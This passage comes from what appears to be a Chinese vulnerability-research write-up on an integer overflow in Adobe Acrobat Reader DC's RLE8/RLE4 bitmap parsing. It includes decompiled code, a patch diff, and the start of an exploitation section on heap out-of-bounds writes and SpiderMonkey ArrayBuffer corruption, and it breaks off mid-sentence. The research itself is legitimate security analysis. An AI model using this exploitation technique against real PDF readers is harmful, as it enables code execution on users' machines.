class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 算法</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, 从左往右</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, 从下往上</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// 读取 2 字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// 第一个字节不为零</span></span><br><span class="line">      &#123;                                         <span class="comment">// 表示有压缩数据等待处理</span></span><br><span class="line">        <span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 展开数据</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// 第一字节为零且第二字节不为零</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// 位图结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta 数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// 向右移动</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// 向上移动</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// 未压缩数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// 整数溢出检查</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// 读取未压缩数据</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// 数据对齐</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// 当前行结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// 从下往上移动一行</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// 移动到行的起点</span></span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于前面的补丁分析，很明显下面的 <code>if</code> 语句中存在整数溢出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F AcroForm 2019.012.20036 中修复的基本块</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>这里在计算 <code>(unsigned __int8)cmd + xpos</code> 时可能导致整数溢出，且其中两个变量的值都可以被控制。在解析特定的 RLE8 数据时，如果触发这里的整数溢出，后续便可以实现堆块越界写。</p><ol><li>变量 <code>(unsigned __int8)cmd</code> 的值是可以直接控制的，其取值范围为 <code>[1, 255]</code> </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// 读取 2 字节数据</span></span><br></pre></td></tr></table></figure><ol start="2"><li>变量 <code>xpos</code> 的值也是可以直接控制的，只需要在 <strong>编码模式</strong> 中布局大量 <code>delta</code> 命令即可使得 <code>xpos</code> 的值接近 <code>0xFFFFFFFF</code> </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// 向右移动, xdelta 取值范围为 [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// 向上移动</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>因为 <code>xpos</code> 非常大（有符号表示为负数），因此在处理 RLE8 压缩数据时可以实现堆块越界写（往低地址方向越界写），并且写的数据也是完全可控的，只不过所有数据都必须是同样的值</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// 可控数据实现堆块越界写</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 解压数据</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-解析"><a href="#4-2-2-RLE4-解析" class="headerlink" title="4.2.2 RLE4 解析"></a>4.2.2 RLE4 解析</h4><p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE4 压缩数据的部分代码如下（实现 RLE4 解压的代码比 RLE8 解压的代码稍微复杂一点，因为数据单位不再是一个字节，而是半个字节）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 算法</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, 从左往右</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, 从下往上</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// 读取 2 字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// 第一个字节不为零</span></span><br><span class="line">      &#123;                                     <span class="comment">// 表示有压缩数据等待处理</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// 高 4 位数据</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// 低 4 位数据</span></span><br><span class="line">        <span class="comment">// 20CF45F8 变动的基本块之一</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// 偶数索引 -&gt; 高 4 位数据</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// 奇数索引 -&gt; 低 4 位数据</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// xpos 为奇数, 存入已有字节</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// xpos 为偶数, 存入新的字节</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// 第一字节为零且第二字节不为零</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// 位图结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta 数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// 向右移动</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// 向上移动</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA 变动的基本块之一</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// 未压缩数据</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// 读取 1 字节数据</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// 低 4 位数据</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// 高 4 位数据</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// 数据对齐</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// 当前行结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// 从下往上移动一行</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// 移动到行的起点</span></span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在两个位置可以触发整数溢出，其中一处位于处理压缩数据的过程中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// 高 4 位数据</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// 低 4 位数据</span></span><br><span class="line"><span class="comment">// 20CF45F8 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>另一处位于处理未压缩数据的过程中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05. 漏洞利用"></a>0x05. 漏洞利用</h2><h3 id="5-1-溢出目标"><a href="#5-1-溢出目标" class="headerlink" title="5.1 溢出目标"></a>5.1 溢出目标</h3><p>前面提到在解析 RLE 数据时发现了 3 个溢出点，这里选择其中相对容易写利用的溢出点来触发漏洞：位于 RLE8 数据解析过程中的一处整数溢出。</p><p>RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 <code>xpos</code> 的值除以 <code>2</code> ，此时偏移值最大可以是 <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。</p><p>而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 <code>xpos</code> 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，<code>(unsigned __int8)cmd</code> 的最大值可以是 <code>0xFF</code> ，为了绕过 <code>if</code> 语句中的条件检查，<code>xpos</code> 的最小值是 <code>0xFFFFFF01</code> （在有符号类型下表示为 <code>-255</code>）。这也就意味着最大可以向低地址方向越界写 <code>0xFF</code> 字节的数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>但需要注意的是，用于越界写的数据必须是一样的，即只能是同一个字节。这会给漏洞利用带来一些额外的问题，后续会对此进行详细讨论。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-基础知识"><a href="#5-2-SpiderMonkey-基础知识" class="headerlink" title="5.2 SpiderMonkey 基础知识"></a>5.2 SpiderMonkey 基础知识</h3><p>Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> ，在编写利用代码之前，先简单介绍一下相关的基础知识。</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> 而言，当 <code>byteLength</code> 的大小超过 <code>0x68</code> 时，其底层数据存储区（<strong>backing store</strong>）所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>byteLength</code> 的大小小于等于 <code>0x68</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>tenured heap</strong> 申请。同时，当 <strong>backing store</strong> 独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// 可以是任意值，通常为 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// view 对象指针</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// 可以是任意值，通常为 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对 <code>ArrayBuffer</code> 而言，这里 <code>ObjectElements</code> 的各个成员的名字是没有意义的（因为本来是为 <code>Array</code> 准备的），这里第二个成员 <code>initializedLength</code> 存储 <code>byteLength</code> 的值，第三个成员 <code>capacity</code> 存储关联的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> 对象的指针，其他成员可以是任意值。</p><p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p><code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>在漏洞利用过程中，如果可以更改 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 为一个更大的值，那么就可以基于 <code>ArrayBuffer</code> 对象实现越界读写了。不过需要注意后面的 <code>4</code> 字节数据要么为零，要么指向一个 <strong>合法</strong> 的 <code>DataView</code> 对象，否则进程会立刻崩溃。</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> 而言，当 <code>length</code> 的大小超过 <code>14</code> 